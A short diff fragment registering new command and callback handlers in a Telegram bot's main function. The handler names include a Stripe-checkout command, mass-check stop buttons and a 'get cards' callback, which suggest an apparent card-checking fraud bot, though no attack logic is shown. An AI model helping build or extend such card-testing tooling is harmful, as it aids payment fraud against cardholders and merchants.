+    app.add_handler(CommandHandler("perf", perf_command))
     app.add_handler(CommandHandler("price", price_command))
     app.add_handler(CommandHandler("tier", tier_command))
     app.add_handler(CommandHandler("settier", set_tier_command))
@@ -88288,6 +89293,7 @@ def main():
     
     # ============ STRIPE CO COMMANDS ============
     app.add_handler(CommandHandler("stco", stco_command))
+    app.add_handler(CommandHandler("stcodiag", stcodiag_command))
     
     # ============ JIO COMMANDS ============
     app.add_handler(CommandHandler("jhit", jhit_command))
@@ -88423,6 +89429,8 @@ def main():
     app.add_handler(CallbackQueryHandler(verify_membership_callback, pattern='^verify_membership$'))
     app.add_handler(CallbackQueryHandler(autosopi_get_cards_callback, pattern="^autosopi_get_"))
     app.add_handler(CallbackQueryHandler(mass_check_stop_callback, pattern="^mcstop_"))
+    app.add_handler(CallbackQueryHandler(universal_stop_callback, pattern="^mstop_"))
+    app.add_handler(CallbackQueryHandler(universal_stop_callback, pattern="^autosopi_stop_"))
     app.add_handler(CallbackQueryHandler(results_get_callback, pattern="^resget_"))
     app.add_handler(CallbackQueryHandler(reftop_callback, pattern="^ref(top|back)$"))
     app.add_handler(CallbackQueryHandler(settings_callback, pattern="^settings_(menu|hide|unhide)$"))
